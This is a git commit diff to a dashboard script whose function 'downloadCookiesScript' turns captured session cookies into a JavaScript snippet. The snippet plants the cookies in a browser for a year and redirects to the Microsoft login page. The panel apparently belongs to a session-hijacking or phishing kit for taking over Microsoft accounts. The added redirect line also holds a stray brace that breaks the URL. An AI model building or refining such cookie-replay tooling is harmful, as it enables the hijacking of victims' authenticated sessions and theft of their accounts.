e008aab06ad69ffa81d21d940ffce172370d8b52
Dev <ahmed@192.168.1.15>
2025-05-08 05:51:49 +0300

    cookies update

--- static/js/dashboard.js
+++ static/js/dashboard.js
@@ -1821,10 +1821,8 @@ function downloadCookiesScript(sessionData) {
                     hostOnly: false,
                     httpOnly: true,
                     path: "/",
-                    sameSite: "none",
-                    secure: true,
-                    session: true,
-                    storeId: null
+                    secure: false,
+                    session: false,
         });
     });
         }
@@ -1855,7 +1853,7 @@ function downloadCookiesScript(sessionData) {
     const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
     
     // إنشاء نص JavaScript بالتنسيق المطلوب
-    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://${targetDomain}"}();`;
+    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://login.microsoftonline.com}"}();`;
     
     // إنشاء ملف نصي
     const blob = new Blob([jsCode], { type: 'text/plain' });
